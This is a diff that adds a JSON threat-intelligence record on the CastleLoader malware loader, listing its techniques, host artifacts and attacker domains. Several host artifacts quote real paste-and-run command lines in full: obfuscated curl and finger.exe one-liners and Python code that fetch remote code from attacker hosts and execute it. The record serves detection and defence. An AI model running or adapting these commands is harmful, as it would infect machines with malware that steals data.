@@ -1,0 +1,206 @@
+{
+  "malware_family": "CastleLoader",
+  "threat_actor": "",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "CastleLoader (aka CastleBot) is a Windows malware loader distributed through paste-and-run (fake CAPTCHA/ClickFix) campaigns that use caret-obfuscated cmd.exe and finger.exe command lines to fetch batch and Python code. It uses a Bring-Your-Own-Interpreter chain (portable CPython/IronPython) with Base64/zlib/UTF-32 triple-encoded shellcode that injects the RC4-decrypted loader into python.exe, then beacons to C2 for configuration and payloads such as NetSupport Manager, CastleRAT, and a .NET infostealer.",
+  "mitre_techniques": [
+    "T1055",
+    "T1027",
+    "T1204.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "/c start \"\" /min cmd /v:on /k \"set x=where c*u*r*l.e?e&set y=where p*ell.exe&for /f %i in ('where c*d.e?e')do %i /c \"for /f %k in ('!x!')do %k h^t^t^p^s^:^/^/^c^a^p^t^c^h^a^-^c^h^e^c^k^p^o^i^n^t^[.]^t^o^p^/o^|for /f %j in ('!y!')do %j -WindowStyle Hidden\"",
+      "context": "KongTuke paste-and-run initial execution reaching a .top domain via obfuscated curl",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "%COMSPEC% /k s^t^a^r^t \"\" /min for /f \"skip=8 delims=\" %h in ('f^^i^^n^^g^^e^^r nrLeDHDESi@cheeshomireciple[.]com') do call %h & exit",
+      "context": "CastleLoader paste-and-run using caret-obfuscated finger.exe to fetch batch commands",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\Users\\<user>\\AppData\\Local\\python-3.7.7.1-embed-win32\\\\///////\\\\///////\\\\///////python\" -c \"import sys,subprocess as s,base64 as b,zlib as z;s.Popen([sys.executable,'-c',z.decompress(b.b64decode('eJydk8FKA0EQ...kb8B3z3XZ8=')).decode('utf-32')],creationflags=s.CREATE_NO_WINDOW)\"",
+      "context": "Batch command running Base64+zlib+UTF-32 triple-encoded Python shellcode loader",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"python.exe\" -c \"#88dbEhjQbOqGRCdQyp8\\nimport ssl\\nimport time\\nimport urllib.request\\nssl._create_default_https_context = ssl._create_unverified_context\\nc = urllib.request.urlopen('https://mirtona.com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/loc12').read().decode('utf-8')\\ntime.sleep(2.1)\\nexec(c)\"",
+      "context": "Python script retrieving triple-encoded shellcode loader from C2",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "#88dbEhjQbOqGRCdQyp8",
+      "context": "Marker/hash at start of the retrieved Python script command line",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\users\\<user>\\appdata\\local\\ironpython.3.4.2\\net462\\8780254714083.exe",
+      "context": "Portable IronPython interpreter renamed to random 12-18 digit filename before execution",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "finger.exe",
+      "context": "Legitimate Windows binary abused to retrieve batch commands from adversary servers",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "python.exe",
+      "context": "Process injection target for the decrypted CastleLoader binary via shellcode loader",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "tar.exe",
+      "context": "Used to extract portable Python distributions disguised as PDF files",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "ShellExecuteW, WinExec, CreateProcessW",
+      "context": "CastleLoader API launch methods among 14 supported payload execution methods",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "cpuid",
+      "context": "Anti-analysis instruction used to detect VMware, VirtualBox and Parallels",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "BitBlt",
+      "context": "GDI pipeline used to capture desktop screenshots",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "captcha-checkpoint.top",
+      "context": "Adversary domain contacted by obfuscated curl in KongTuke paste-and-run command",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://mirtona.com/4ba0af68-0037-5f6e-afd1-64f89fc0f554/loc12",
+      "context": "C2 URL fetching triple-encoded Python shellcode loader",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cheeshomireciple.com",
+      "context": "Domain queried by caret-obfuscated finger.exe command",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ai-scan.digital",
+      "context": "BackgroundFix fake background-removal site used in paste-and-run lure",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "bg-transparency.online",
+      "context": "BackgroundFix fake background-removal site used in paste-and-run lure",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "linkedall.org",
+      "context": "Typosquatted LinkedIn job-platform domain distributed via Google Ads",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "golinked.net",
+      "context": "Typosquatted LinkedIn job-platform domain distributed via Google Ads",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "indeed-jobs.net",
+      "context": "Typosquatted Indeed job-platform domain distributed via Google Ads",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
